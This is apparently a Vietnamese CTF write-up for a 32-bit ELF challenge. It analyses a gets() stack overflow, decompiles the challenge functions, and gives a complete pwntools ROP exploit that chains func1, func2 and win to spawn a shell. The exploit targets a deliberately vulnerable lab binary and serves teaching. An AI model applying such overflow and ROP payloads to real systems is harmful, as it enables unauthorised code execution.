# **Stack Architecture**

File: stack_architecture - ELF linux 32 bit


## Phân tích

### Kiểm tra protection
![image](https://user-images.githubusercontent.com/31529599/147467081-00a89a96-d984-4b64-b44e-279e51ab3312.png)

-> Không bật `Canary` (có khả năng xảy ra buffer overflow) và `PIE` (địa chỉ tĩnh)

### Phân tích bằng IDA

Code hàm `main`:

Hàm main nhận Input bằng hàm gets (lỗi BoF) và một câu lệnh `If` chủ yếu dùng để tránh gọi lại hàm `main` 2 lần bằng cách ghi đè địa chỉ trả về bằng hàm `main`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[80]; // [esp+0h] [ebp-54h] BYREF

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  if ( check1 )
    exit(0);
  gets(s);
  ++check1;
  return 0;
}
```

Code hàm `win`:

Khởi tạo một chuỗi `command` và kiểm tra điều kiện các biến `check_?` nằm ở vùng nhớ BSS, nếu khác `0` thì sẽ tính giá trị chuỗi `command = /bin/sh` xong gọi hàm `system` thực thi lệnh `command`

```c
Elf32_Dyn **win()
{
  Elf32_Dyn **result; // eax
  char command[8]; // [esp+0h] [ebp-10h] BYREF
  int i; // [esp+8h] [ebp-8h]

  result = &GLOBAL_OFFSET_TABLE_;
  strcpy(command, "*]di*nc");
  if ( check2 && check3 && check4 )
  {
    for ( i = 0; i <= 6; ++i )
      command[i] += 5;
    result = (Elf32_Dyn **)system(command);
  }
  return result;
}
```

Vậy ta cần đè địa chỉ trả về cho hàm `win` và phải thỏa mãn các điều kiện trong `win`, Sau đây là các hàm có sẵn thay đổi giá trị của các biến `check_?`

Code hàm `func1`:

Hàm này sẽ gán `check3 = 1` nếu `check2 = 1` và tham số truyền vào bằng `0x20010508` và gán `check2 =1` nếu biến `s1 = "I'm sorry, don't leave me, I want you here with me ~~"`
```c
_DWORD *__cdecl func1(int a1)
{
  _DWORD *result; // eax
  char s1[80]; // [esp+0h] [ebp-54h] BYREF

  if ( check2 && a1 == 0x20010508 )
    check3 = 1;
  result = (_DWORD *)strcmp(s1, "I'm sorry, don't leave me, I want you here with me ~~");
  if ( !result )
  {
    result = &check2;
    check2 = 1;
  }
  return result;
}
```

Code hàm `func2`:

Hàm này sẽ gán `check4 = 1` nếu `check3 =1` và `v1 == 0x8052001` với `v1` có địa chỉ lại `ebp-4`

```c
Elf32_Dyn **func2()
{
  Elf32_Dyn **result; // eax
  int v1; // [esp+0h] [ebp-4h]

  result = &GLOBAL_OFFSET_TABLE_;
  if ( check3 )
  {
    if ( v1 == 0x8052001 )
    {
      result = (Elf32_Dyn **)&check4;
      check4 = 1;
    }
  }
  return result;
}
```

## Khai thác

Theo các thông tin đã phân tích ở trên thì ta có thể thực hiện gọi shell `/bin/sh` từ hàm win và phải thõa điều kiện trong `win` thứ tự gọi hàm như sau để thõa điều kiện:

- gọi `func1` lần 1 và thiết lập `s1 = "I'm sorry, don't leave me, I want you here with me ~~"` để gán `check2 = 1`
- gọi `func1` lần 2 và thiết lập tham số `a1 = 0x20010508` để gán `check3 = 1`
- gọi gadget `pop edi ; pop ebp ; ret` để pop tham số `a1` của `func1` và pop giá trị tại `ebp-4` của hàm `func2` sẽ gọi ở lần tiếp theo
- gọi `func2` để gán `check4 = 1`
- gọi `win` để nhận shell


## Code Khai thác

```python
from pwn import *

e = ELF('./stack_architect')
p = process('./stack_architect')
# p = remote('45.122.249.68', '10018')

payload = b'A'*4 + b"I'm sorry, don't leave me, I want you here with me ~~\x00"  # set s1
payload += (0x54+4 - len(payload))*b'A'  # padding to return address
payload += p32(e.symbols['func1'])  # call func1 to set check2 = 1
payload += p32(e.symbols['func1'])  # call func1 to set check3 = 1
payload += p32(0x08049422)  # pop edi ; pop ebp ; ret
payload += p32(0x20010508)  # argument of func1 to set check3 = 1
payload += p32(0x8052001)   # set v1 at ebp - 4 of func2
payload += p32(e.symbols['func2'])  # call func2 to set check4 = 1
payload += p32(e.symbols['win'])  # final call win to recv shell

f = open('payload.txt', 'wb')


p.sendline(payload)
f.write(payload)
f.close()
p.interactive()
```

## Chạy Script 

![image](https://user-images.githubusercontent.com/31529599/147469185-98482c84-da57-4a2c-b496-f1e5c1c7d4cc.png)



